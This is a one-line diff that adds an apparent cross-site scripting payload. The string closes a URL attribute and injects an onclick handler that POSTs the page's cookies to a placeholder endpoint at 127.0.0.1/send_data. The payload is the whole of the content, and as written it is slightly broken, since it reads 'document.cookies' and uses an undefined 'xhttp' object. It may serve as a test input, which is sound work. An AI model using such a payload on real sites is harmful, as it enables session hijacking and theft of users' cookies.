@@ -1,0 +1,1 @@
+http://google.com"onclick="xhttp.open(&apos;POST&apos;, &apos;http://127.0.0.1/send_data&apos;, true);xhttp.send(document.cookies);"
